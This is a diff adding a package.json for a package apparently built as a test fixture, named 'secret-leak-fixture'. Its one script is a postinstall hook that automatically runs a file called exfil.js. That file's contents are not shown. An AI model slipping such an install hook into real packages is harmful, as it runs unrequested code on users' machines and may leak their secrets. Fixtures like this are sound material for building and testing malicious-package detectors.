@@ -1,0 +1,7 @@
+{
+  "name": "secret-leak-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node ./exfil.js"
+  }
+}
